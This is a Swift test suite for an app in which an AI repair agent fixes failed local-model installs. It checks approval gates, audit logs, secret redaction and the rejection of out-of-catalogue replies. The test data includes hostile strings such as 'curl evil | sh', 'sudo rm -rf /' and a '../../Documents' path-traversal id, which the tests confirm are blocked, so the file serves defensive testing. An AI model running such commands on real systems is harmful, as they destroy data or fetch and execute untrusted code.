import Foundation
import Testing

@testable import AgentGateCore

private func failure(_ cause: any Error & Sendable, step: InstallStep = .download, tail: String? = nil) -> InstallFailure {
  InstallFailure(step: step, message: String(describing: cause), cause: cause, logTail: tail)
}

@Suite struct RepairPolicyTests {
  @Test func classifiesEveryKnownError() {
    let cases: [(any Error & Sendable, FailureClass)] = [
      (DownloadError.stalled, .network), (DownloadError.http(503), .network),
      (DownloadError.gaveUp(attempts: 3, last: "x"), .network), (DownloadError.writeFailed("x"), .network),
      (DownloadError.diskFull, .diskFull), (DownloadError.notEnoughDisk(needed: 2, free: 1), .diskFull),
      (DownloadError.checksumMismatch, .corruptFile), (DownloadError.sizeMismatch(expected: 2, got: 1), .corruptFile),
      (DownloadError.alreadyInProgress, .unrepairable), (DownloadError.cancelled, .unrepairable),
      (RuntimeError.outOfMemory, .outOfMemory), (RuntimeError.loadTimedOut, .loadTimedOut),
      (RuntimeError.noFreePort, .portInUse), (RuntimeError.missingBinary("x"), .unrepairable),
      (RuntimeError.exited(code: 1, logTail: "couldn't bind"), .portInUse),
      (RuntimeError.exited(code: 139, logTail: "segfault"), .engineCrashed),
      (PlanError.incompatible("Needs 9.0 GB of free disk; 1.0 GB is free."), .diskFull),
      (PlanError.incompatible("Needs 9.0 GB of memory for a model; this Mac has 4.0 GB."), .unrepairable),
    ]
    for (error, expected) in cases { #expect(FailureClass.classify(failure(error)) == expected, "\(error)") }
  }

  @Test func defaultRepairStepsThroughOptionsThenStops() {
    #expect(FailureClass.outOfMemory.defaultRepair(after: []) == [.reduceContext])
    #expect(FailureClass.outOfMemory.defaultRepair(after: [.reduceContext]) == [.lowerQuantization])
    #expect(FailureClass.outOfMemory.defaultRepair(after: [.reduceContext, .lowerQuantization]).isEmpty)
    #expect(FailureClass.network.defaultRepair(after: []) == [.retryDownload])
    // A full disk, or an unknown failure, never gets a default that deletes or guesses.
    #expect(FailureClass.diskFull.defaultRepair(after: []).isEmpty)
    #expect(FailureClass.unrepairable.defaultRepair(after: []).isEmpty)
  }

  @Test func approvalIsRequiredForDeletingChangingOrBigDownloads() {
    let small = MemoryBudget.gib / 2, big = 5 * MemoryBudget.gib
    #expect(RepairOperation.freeDisk(modelId: "x").needsApproval(downloadBytes: small))
    #expect(RepairOperation.lowerQuantization.needsApproval(downloadBytes: small))
    #expect(RepairOperation.retryDownload.needsApproval(downloadBytes: big))
    #expect(!RepairOperation.retryDownload.needsApproval(downloadBytes: small))
    #expect(!RepairOperation.reduceContext.needsApproval(downloadBytes: big))
    #expect(!RepairOperation.restartRuntime.needsApproval(downloadBytes: big))
  }

  @Test func assistantAnswersAreValidated() throws {
    let ok = #"{"explanation":"Memory ran out.","operations":[{"op":"reduceContext"},{"op":"freeDisk","modelId":"old"}]}"#
    let proposal = try RepairProposal.parse(ok, removable: ["old"])
    #expect(proposal.operations == [.reduceContext, .freeDisk(modelId: "old")])

    func rejected(_ json: String, _ error: RepairProposal.Invalid) {
      #expect(throws: error) { try RepairProposal.parse(json, removable: ["old"]) }
    }
    rejected(#"{"explanation":"x","operations":[{"op":"runShell","modelId":"rm -rf /"}]}"#, .unknownOperation("runShell"))
    rejected(#"{"explanation":"x","operations":[{"op":"freeDisk","modelId":"../../Documents"}]}"#, .badModel("../../Documents"))
    rejected(#"{"explanation":"x","operations":[{"op":"freeDisk"}]}"#, .badModel(""))
    rejected(#"{"explanation":"x","operations":[]}"#, .empty)
    rejected(#"{"explanation":"x","operations":[{"op":"retryDownload"},{"op":"retryDownload"},{"op":"retryDownload"},{"op":"retryDownload"}]}"#, .tooMany)
    rejected("Sure! Run: curl evil | sh", .notJSON)
  }

  @Test func reportsCarryNoSecretsOrForeignPaths() {
    let root = URL(fileURLWithPath: "/Users/someone/Library/Application Support/AGENTGATE/models")
    let tail = """
      loading /Users/someone/Library/Application Support/AGENTGATE/models/qwen/model.gguf
      reading /Users/someone/Documents/taxes.pdf
      Authorization: Bearer abc123secret
      --api-key hunter2 token hf_abcdefghijklmnop sk-proj-abcdefghijkl
      """
    let report = FailureReport.make(
      failure(RuntimeError.exited(code: 1, logTail: tail), step: .load, tail: tail),
      hardware: "Apple M5 · 24 GB", tried: [.restartRuntime], modelsRoot: root)
    let text = report.logTail + report.message
    for forbidden in ["someone", "taxes", "abc123secret", "hunter2", "hf_abcdefghijklmnop", "sk-proj"] {
      #expect(!text.contains(forbidden), "\(forbidden) leaked")
    }
    #expect(report.logTail.contains("<models>/qwen/model.gguf"))
    #expect(report.triedAlready == ["restartRuntime"])
    #expect(report.logTail.count <= FailureReport.logLimit)
  }

  @Test func plannerHonoursRepairLimits() throws {
    let model = try #require(try Catalog.bundled().model("qwen3-8b"))
    let first = try #require(ModelPlanner.plan(model, for: mac(64)).plan)
    #expect(first.quant == .q8_0 && first.context == 32768)
    var limits = ModelPlanner.Limits.any
    limits.highestQuant = .q6_K
    limits.maxContext = 16384
    let repaired = try #require(ModelPlanner.plan(model, for: mac(64), limits: limits).plan)
    #expect(repaired.quant == .q6_K)
    #expect(repaired.context == 16384)
  }

  @Test func auditLogKeepsEntriesPrivateAndBounded() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("audit-\(UUID().uuidString)")
    defer { try? FileManager.default.removeItem(at: dir) }
    let log = AuditLog(file: dir.appendingPathComponent("a.json"))
    for index in 0..<(AuditLog.limit + 5) {
      try log.append(AuditEntry(date: Date(), modelId: "m", operation: "op\(index)", reason: "r", outcome: .done))
    }
    let entries = log.entries()
    #expect(entries.count == AuditLog.limit)
    #expect(entries.last?.operation == "op\(AuditLog.limit + 4)")
    let mode = try FileManager.default.attributesOfItem(atPath: log.file.path)[.posixPermissions] as? Int
    #expect(mode == 0o600)
  }
}

private struct Scripted: RepairAssistant {
  var reply: String
  func propose(for report: FailureReport, removable: [String]) async throws -> String { reply }
}

private actor Asked {
  var operations: [RepairOperation] = []
  func add(_ operation: RepairOperation) { operations.append(operation) }
}

/// Runs the repair loop against a model too big for any disk, which fails at the compatibility step
/// before any network or engine is used.
@Suite struct RepairRunnerTests {
  struct Rig {
    let dir: URL
    let store: ModelStore
    let audit: AuditLog
    let model: CatalogModel

    init() throws {
      dir = FileManager.default.temporaryDirectory.appendingPathComponent("repair-\(UUID().uuidString)")
      store = ModelStore(root: dir.appendingPathComponent("models"))
      audit = AuditLog(file: dir.appendingPathComponent("audit.json"))
      var model = try #require(try Catalog.bundled().model("qwen3-4b-2507"))
      for index in model.gguf.files.indices { model.gguf.files[index].bytes = 50_000 * MemoryBudget.gib }
      self.model = model
      let old = InstalledModel(
        id: "old-model", name: "Old", quant: .q4_K_M, file: "old.gguf", sha256: "00", bytes: 4,
        backend: .llamaCpp, config: RuntimeConfig(context: 8192, gpuLayers: 999, kvCacheType: "q8_0", flashAttention: true, threads: 4),
        readiness: .ready, reason: "", verifiedAt: Date())
      try FileManager.default.createDirectory(at: store.folder(old.id), withIntermediateDirectories: true)
      try Data("data".utf8).write(to: store.fileURL(old))
      try store.save(old)
    }

    func runner(reply: String?, approve: @escaping @Sendable (RepairOperation, FailureReport) async -> Bool) -> RepairRunner {
      var pipeline = InstallPipeline()
      pipeline.store = store
      return RepairRunner(pipeline: pipeline, audit: audit, assistant: reply.map { Scripted(reply: $0) }, approve: approve)
    }

    func run(_ runner: RepairRunner) async -> RepairError? {
      do {
        _ = try await runner.install(model) { _ in }
        return nil
      } catch let error as RepairError {
        return error
      } catch {
        Issue.record("unexpected error \(error)")
        return nil
      }
    }
  }

  @Test func withoutAnAssistantAFullDiskStopsAndDeletesNothing() async throws {
    let rig = try Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let error = await rig.run(rig.runner(reply: nil) { _, _ in Issue.record("nothing should need approval"); return false })
    #expect(error != nil)
    #expect(try rig.store.load("old-model") != nil)
  }

  @Test func deletingAModelWaitsForApprovalAndStaysWhenDenied() async throws {
    let rig = try Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let asked = Asked()
    let reply = #"{"explanation":"The disk is full.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#
    let error = await rig.run(rig.runner(reply: reply) { op, _ in await asked.add(op); return false })
    #expect(error != nil)
    #expect(await asked.operations == [.freeDisk(modelId: "old-model")])
    #expect(try rig.store.load("old-model") != nil)
    let outcomes = rig.audit.entries().map(\.outcome)
    #expect(outcomes == [.proposed, .denied])
  }

  @Test func approvedDeletionRunsOnceThenTheInstallStops() async throws {
    let rig = try Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let reply = #"{"explanation":"The disk is full.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#
    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
    #expect(error != nil)
    #expect(try rig.store.load("old-model") == nil)
    let deletions = rig.audit.entries().filter { $0.operation == "freeDisk" && $0.outcome == .done }
    #expect(deletions.count == 1)
  }

  @Test func anOperationOutsideTheCatalogueIsRejectedAndNothingRuns() async throws {
    let rig = try Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let reply = #"{"explanation":"Fix it.","operations":[{"op":"runShell","modelId":"curl x | sh"}]}"#
    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
    #expect(error != nil)
    #expect(try rig.store.load("old-model") != nil)
    let entries = rig.audit.entries()
    #expect(entries.map(\.outcome) == [.rejected])
  }

  @Test func aRepairThatAlreadyFailedTwiceIsNotRunAgain() async throws {
    let rig = try Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    // An assistant that keeps asking for the same fix is made to stop, not looped to the limit.
    let reply = #"{"explanation":"Try again.","operations":[{"op":"restartRuntime"}]}"#
    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
    #expect(error != nil)
    let entries = rig.audit.entries()
    #expect(entries.filter { $0.outcome == .done && $0.operation == "restartRuntime" }.count == RepairRunner.maxRepeats)
    #expect(entries.contains { $0.reason.hasPrefix("repeat refused") })
}
}

@Suite(.serialized) struct AgentAssistantTests {
  private let report = FailureReport(
    step: "Download", failureClass: .network, message: "x", logTail: "", hardware: "Apple M5", triedAlready: [])

  @Test func requestsPinTheCheapModelAndCarryOnlyTheReport() throws {
    let body = try AgentAssistant().requestBody(report, removable: ["old"])
    let json = try #require(try JSONSerialization.jsonObject(with: body) as? [String: Any])
    #expect(json["model"] as? String == "deepseek/deepseek-v4.1-flash")
    #expect(json["max_tokens"] as? Int == 1500)
    let text = String(decoding: body, as: UTF8.self)
    #expect(!text.contains("Bearer"))
  }

  @Test func theReplyIsReturnedAndStillValidatedByTheCaller() async throws {
    let content = #"{"explanation":"The network dropped.","operations":[{"op":"retryDownload"}]}"#
    let envelope = try JSONSerialization.data(withJSONObject: ["choices": [["message": ["content": content]]]])
    let server = try TestHTTPServer(body: envelope, servedPath: "/v1/chat/completions")
    defer { server.stop() }
    let assistant = AgentAssistant(baseURL: server.url("/v1"), apiKey: { "test-key" })
    let reply = try await assistant.propose(for: report, removable: [])
    #expect(try RepairProposal.parse(reply, removable: []).operations == [.retryDownload])
  }

  @Test func missingKeyAndServerErrorsAreReported() async throws {
    let none = AgentAssistant(apiKey: { nil })
    await #expect(throws: AgentAssistant.Failure.noKey) { try await none.propose(for: report, removable: []) }
    let server = try TestHTTPServer(body: Data(), fault: .answer(status: 401), servedPath: "/v1/chat/completions")
    defer { server.stop() }
    let rejected = AgentAssistant(baseURL: server.url("/v1"), apiKey: { "bad" })
    await #expect(throws: AgentAssistant.Failure.http(401)) { try await rejected.propose(for: report, removable: []) }
  }

  @Test func keychainRoundTripsAndDeletes() throws {
    let box = Keychain(service: "AGENTGATE Studio tests", account: UUID().uuidString)
    defer { try? box.delete() }
    #expect(try box.read() == nil)
    try box.save("secret-1")
    try box.save("secret-2")
    #expect(try box.read() == "secret-2")
    try box.delete()
    #expect(try box.read() == nil)
  }
}

private actor Sequence: RepairAssistant {
  let replies: [String]
  var index = 0
  var reports: [FailureReport] = []
  init(_ replies: [String]) { self.replies = replies }
  func propose(for report: FailureReport, removable: [String]) async throws -> String {
    reports.append(report)
    defer { index = min(index + 1, replies.count - 1) }
    return replies[index]
  }
}

@Suite struct RepairInvestigationTests {
  @Test func parametersAreValidated() throws {
    let ok = try RepairProposal.parse(
      #"{"explanation":"x","operations":[{"op":"setContext","to":"8192"},{"op":"setQuantization","to":"Q4_K_M"}]}"#, removable: [])
    #expect(ok.operations == [.setContext(8192), .setQuantization(.q4_K_M)])
    #expect(throws: RepairProposal.Invalid.badValue("setContext")) {
      try RepairProposal.parse(#"{"explanation":"x","operations":[{"op":"setContext","to":"999999"}]}"#, removable: [])
    }
    #expect(throws: RepairProposal.Invalid.badValue("setQuantization")) {
      try RepairProposal.parse(#"{"explanation":"x","operations":[{"op":"setQuantization","to":"Q1"}]}"#, removable: [])
    }
  }

  @Test func repliesAreEitherAProbeOrAProposal() throws {
    #expect(try RepairReply.parse(#"{"explanation":"look","probe":"diskFree"}"#, removable: []) == .probe(.diskFree))
    #expect(throws: RepairProposal.Invalid.self) { try RepairReply.parse(#"{"explanation":"x","probe":"rm -rf /"}"#, removable: []) }
    #expect(throws: RepairProposal.Invalid.self) { try RepairReply.parse("hello", removable: []) }
  }

  @Test func approvalAppliesToChosenQuantization() {
    #expect(RepairOperation.setQuantization(.q4_K_M).needsApproval(downloadBytes: 0))
    #expect(!RepairOperation.setContext(8192).needsApproval(downloadBytes: 0))
  }

  @Test func theAssistantInvestigatesThenDecidesAndEverythingIsLogged() async throws {
    let rig = try RepairRunnerTests.Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let assistant = Sequence([
      #"{"explanation":"Check the disk.","probe":"diskFree"}"#,
      #"{"explanation":"Check the folder.","probe":"modelsFolder"}"#,
      #"{"explanation":"Remove the old model.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#,
    ])
    var pipeline = InstallPipeline()
    pipeline.store = rig.store
    let runner = RepairRunner(pipeline: pipeline, audit: rig.audit, assistant: assistant) { _, _ in false }
    _ = try? await runner.install(rig.model) { _ in }
    let reports = await assistant.reports
    #expect(reports.count >= 3)
    #expect(reports[1].findings.first?.hasPrefix("diskFree:") == true)
    #expect(reports[2].findings.count == 2)
    let entries = rig.audit.entries()
    #expect(entries.filter { $0.reason.hasPrefix("probe ") }.count == 2)
    #expect(entries.contains { $0.operation == "freeDisk" && $0.outcome == .denied })
    #expect(try rig.store.load("old-model") != nil)
  }

  @Test func probesAreLimited() async throws {
    let rig = try RepairRunnerTests.Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let assistant = Sequence([#"{"explanation":"again","probe":"diskFree"}"#])
    var pipeline = InstallPipeline()
    pipeline.store = rig.store
    let runner = RepairRunner(pipeline: pipeline, audit: rig.audit, assistant: assistant) { _, _ in false }
    _ = try? await runner.install(rig.model) { _ in }
    #expect(rig.audit.entries().filter { $0.reason.hasPrefix("probe ") }.count <= RepairRunner.maxProbes)
  }
}

private actor Asked2 { var operations: [RepairOperation] = []; func add(_ o: RepairOperation) { operations.append(o) } }

@Suite struct RepairCommandTests {
  private func run(_ replies: [String], approve: Bool) async throws -> (findings: [String], asked: [RepairOperation], audit: [AuditEntry]) {
    let rig = try RepairRunnerTests.Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let assistant = Sequence(replies)
    let asked = Asked2()
    var pipeline = InstallPipeline()
    pipeline.store = rig.store
    let runner = RepairRunner(pipeline: pipeline, audit: rig.audit, assistant: assistant) { op, _ in
      await asked.add(op)
      return approve
    }
    _ = try? await runner.install(rig.model) { _ in }
    let reports = await assistant.reports
    return (reports.last?.findings ?? [], await asked.operations, rig.audit.entries())
  }

  private let stop = #"{"explanation":"done","operations":[{"op":"cancelAndCleanUp"}]}"#

  @Test func anApprovedCommandRunsAndItsOutputReachesTheAssistant() async throws {
    let result = try await run([#"{"explanation":"look","command":"echo hello-from-repair"}"#, stop], approve: true)
    #expect(result.asked.first == .runCommand("echo hello-from-repair"))
    #expect(result.findings.first?.contains("hello-from-repair") == true)
    #expect(result.audit.contains { $0.operation == "runCommand" && $0.outcome == .done })
  }

  @Test func aCommandTheRulesForbidIsNeverAskedAboutOrRun() async throws {
    let result = try await run([#"{"explanation":"look","command":"sudo rm -rf /"}"#, stop], approve: true)
    #expect(result.asked.isEmpty)
    #expect(result.findings.first?.contains("blocked by the rules") == true)
    #expect(result.audit.contains { $0.operation == "runCommand" && $0.outcome == .rejected })
  }

  @Test func aDeclinedCommandDoesNotRun() async throws {
    let result = try await run([#"{"explanation":"look","command":"echo should-not-appear"}"#, stop], approve: false)
    #expect(result.asked == [.runCommand("echo should-not-appear")])
    #expect(result.findings.first?.contains("declined") == true)
    #expect(result.findings.first?.contains("should-not-appear") == false || result.findings.first?.contains("command echo") == true)
    #expect(!result.audit.contains { $0.outcome == .done && $0.reason.hasPrefix("ran:") })
  }

  @Test func theAssistantCannotListRunCommandAsARepair() {
    #expect(throws: RepairProposal.Invalid.unknownOperation("runCommand")) {
      try RepairProposal.parse(#"{"explanation":"x","operations":[{"op":"runCommand"}]}"#, removable: [])
    }
  }
}


@Suite struct RepairMirrorAndSearchTests {
  @Test func onlyListedMirrorsAreAccepted() throws {
    let ok = try RepairProposal.parse(#"{"explanation":"x","operations":[{"op":"useMirror","to":"https://hf-mirror.com"}]}"#, removable: [])
    #expect(ok.operations == [.useMirror("https://hf-mirror.com")])
    #expect(throws: RepairProposal.Invalid.badValue("useMirror")) {
      try RepairProposal.parse(#"{"explanation":"x","operations":[{"op":"useMirror","to":"https://evil.example"}]}"#, removable: [])
    }
    #expect(RepairOperation.useMirror("https://hf-mirror.com").needsApproval(downloadBytes: 0))
  }

  @Test func referencesMustBeHTTPSAndFew() throws {
    let json = #"{"explanation":"x","operations":[{"op":"retryDownload"}],"references":["http://a.example","https://b.example/1","https://c.example","https://d.example","https://e.example"]}"#
    #expect(try RepairProposal.parse(json, removable: []).references == ["https://b.example/1", "https://c.example", "https://d.example"])
  }

  @Test func aSearchReplyIsRecognisedAndBounded() throws {
    #expect(try RepairReply.parse(#"{"explanation":"look","search":"hf 503 resume"}"#, removable: []) == .search("hf 503 resume"))
    #expect(throws: RepairProposal.Invalid.self) {
      try RepairReply.parse(#"{"explanation":"x","search":"\#(String(repeating: "a", count: 300))"}"#, removable: [])
    }
  }

  @Test func searchFindingsAndSourcesReachTheNextRound() async throws {
    let rig = try RepairRunnerTests.Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    let assistant = SearchingAssistant()
    var pipeline = InstallPipeline()
    pipeline.store = rig.store
    let runner = RepairRunner(pipeline: pipeline, audit: rig.audit, assistant: assistant) { _, _ in true }
    _ = try? await runner.install(rig.model) { _ in }
    let reports = await assistant.reports
    #expect(reports.count >= 2)
    #expect(reports[1].findings.first?.contains("Sources: https://example.com/fix") == true)
    #expect(rig.audit.entries().contains { $0.reason.hasPrefix("search ") })
  }
}

private actor SearchingAssistant: RepairAssistant {
  var reports: [FailureReport] = []
  func propose(for report: FailureReport, removable: [String]) async throws -> String {
    reports.append(report)
    return report.findings.isEmpty
      ? #"{"explanation":"look it up","search":"huggingface 503 download"}"#
      : #"{"explanation":"Done.","operations":[{"op":"cancelAndCleanUp"}],"references":["https://example.com/fix"]}"#
  }
  nonisolated func search(_ query: String) async throws -> String { "Try the mirror. Sources: https://example.com/fix" }
}

@Suite struct AgentProfileTests {
  @Test func addedAgentsAreValidated() throws {
    let ok = try AgentProfile.custom(name: "GPT", baseURL: "https://api.openai.com/v1/", model: "gpt-4.1-mini")
    #expect(ok.baseURL == "https://api.openai.com/v1" && !ok.isOpenRouter && !ok.isBuiltIn)
    #expect(try AgentProfile.custom(name: "Local", baseURL: "http://127.0.0.1:8080/v1", model: "qwen").baseURL.hasPrefix("http://127"))
    for bad in [("", "https://x.example", "m"), ("A", "http://evil.example/v1", "m"), ("A", "not a url", "m"),
                ("A", "https://x.example", "has space"), ("A", "https://x.example", "")] {
      #expect(throws: AgentProfileError.self) { try AgentProfile.custom(name: bad.0, baseURL: bad.1, model: bad.2) }
    }
  }

  @Test func storeKeepsKeysOutOfTheFileAndRemovesThem() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("agents-\(UUID().uuidString)")
    defer { try? FileManager.default.removeItem(at: dir) }
    let store = AgentStore(file: dir.appendingPathComponent("agents.json"))
    let profile = try AgentProfile.custom(name: "Test", baseURL: "https://api.example.com/v1", model: "m1")
    defer { try? profile.keychain.delete() }
    try store.add(profile, key: "super-secret-key")
    #expect(store.all().map(\.id) == [AgentProfile.builtIn.id, profile.id])
    #expect(try String(contentsOf: store.file, encoding: .utf8).contains("super-secret-key") == false)
    #expect(try profile.keychain.read() == "super-secret-key")
    #expect(AgentStore.isConnected(profile))
    try store.remove(profile.id)
    #expect(store.all().count == 1)
    #expect(try profile.keychain.read() == nil)
  }

  @Test func theBuiltInAgentCannotBeAddedOrRemovedAsCustom() {
    let store = AgentStore(file: FileManager.default.temporaryDirectory.appendingPathComponent("a-\(UUID().uuidString).json"))
    #expect(throws: AgentProfileError.self) { try store.add(.builtIn, key: "k") }
  }

  @Test func everyAgentGetsAPlaybookThatMatchesTheToolbox() throws {
    let text = RepairPlaybook.instructions
    for probe in RepairProbe.allCases { #expect(text.contains(probe.rawValue)) }
    for entry in RepairOperation.catalogue {
      #expect(text.contains(entry.name))
      // Each documented operation really is accepted by the validator.
      let json = #"{"explanation":"x","operations":[\#(entry.example)]}"#
      #expect(throws: Never.self) { try RepairProposal.parse(json, removable: ["old"]) }
    }
    #expect(text.contains("search") && text.contains("command") && text.contains("references"))
  }

  @Test func aCustomAgentUsesItsOwnModelAndLosesOpenRouterOnlyOptions() async throws {
    let profile = try AgentProfile.custom(name: "GPT", baseURL: "https://api.openai.com/v1", model: "gpt-4.1-mini")
    let report = FailureReport(step: "Download", failureClass: .network, message: "x", logTail: "", hardware: "m", triedAlready: [])
    let body = try AgentAssistant(profile: profile, apiKey: { "k" }).requestBody(report, removable: [])
    let json = try #require(try JSONSerialization.jsonObject(with: body) as? [String: Any])
    #expect(json["model"] as? String == "gpt-4.1-mini")
    #expect(json["reasoning"] == nil)
    #expect(try await AgentAssistant(profile: profile, apiKey: { "k" }).search("x").contains("not available"))
    let builtIn = try JSONSerialization.jsonObject(with: AgentAssistant(apiKey: { "k" }).requestBody(report, removable: [])) as? [String: Any]
    #expect(builtIn?["model"] as? String == "deepseek/deepseek-v4.1-flash")
    #expect((builtIn?["reasoning"] as? [String: Bool])?["enabled"] == false)
  }
}


@Suite(.serialized) struct AgentReplyTests {
  @Test func codeFencesAreRemoved() {
    #expect(AgentAssistant.unwrap("```json\n{\"a\":1}\n```") == #"{"a":1}"#)
    #expect(AgentAssistant.unwrap("  {\"a\":1} ") == #"{"a":1}"#)
  }

  @Test func aCutOffAnswerIsRetriedOnceThenRefused() async throws {
    let cut = try JSONSerialization.data(withJSONObject: ["choices": [["message": ["content": ""], "finish_reason": "length"]]])
    let server = try TestHTTPServer(body: cut, servedPath: "/v1/chat/completions")
    defer { server.stop() }
    let assistant = AgentAssistant(baseURL: server.url("/v1"), apiKey: { "k" })
    let report = FailureReport(step: "Load", failureClass: .network, message: "x", logTail: "", hardware: "m", triedAlready: [])
    await #expect(throws: AgentAssistant.Failure.malformed) { try await assistant.propose(for: report, removable: []) }
    #expect(server.requestCount == 2)
  }
}


@Suite struct ApprovalTierTests {
  @Test func tiersFollowRisk() {
    let small: UInt64 = 100, big = 5 * MemoryBudget.gib
    #expect(RepairOperation.restartRuntime.tier(downloadBytes: big) == .act)
    #expect(RepairOperation.retryDownload.tier(downloadBytes: small) == .act)
    #expect(RepairOperation.retryDownload.tier(downloadBytes: big) == .notify)
    #expect(RepairOperation.useMirror("https://hf-mirror.com").tier(downloadBytes: small) == .notify)
    for op: RepairOperation in [.freeDisk(modelId: "x"), .lowerQuantization, .setQuantization(.q4_K_M), .runCommand("ls")] {
      #expect(op.tier(downloadBytes: small) == .ask)
      // Asking is never skipped, whatever autonomy the user picked.
      #expect(op.needsApproval(downloadBytes: small, autonomy: .balanced))
    }
  }

  @Test func balancedActsOnNotifyTierAndCarefulAsks() {
    let mirror = RepairOperation.useMirror("https://hf-mirror.com")
    #expect(mirror.needsApproval(downloadBytes: 0, autonomy: .careful))
    #expect(!mirror.needsApproval(downloadBytes: 0, autonomy: .balanced))
  }

  @Test func anUnansweredQuestionTimesOutAsNo() async throws {
    let rig = try RepairRunnerTests.Rig()
    defer { try? FileManager.default.removeItem(at: rig.dir) }
    var pipeline = InstallPipeline()
    pipeline.store = rig.store
    let reply = #"{"explanation":"The disk is full.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#
    let runner = RepairRunner(
      pipeline: pipeline, audit: rig.audit, assistant: Scripted2(reply: reply), approvalTimeout: .milliseconds(200)
    ) { _, _ in
      try? await Task.sleep(for: .seconds(30))
      return true
    }
    let started = Date()
    let error = await rig.run(runner)
    #expect(Date().timeIntervalSince(started) < 10)
    #expect(error?.description.contains("No answer came") == true)
    #expect(try rig.store.load("old-model") != nil)
  }
}

private struct Scripted2: RepairAssistant {
  var reply: String
  func propose(for report: FailureReport, removable: [String]) async throws -> String { reply }
}
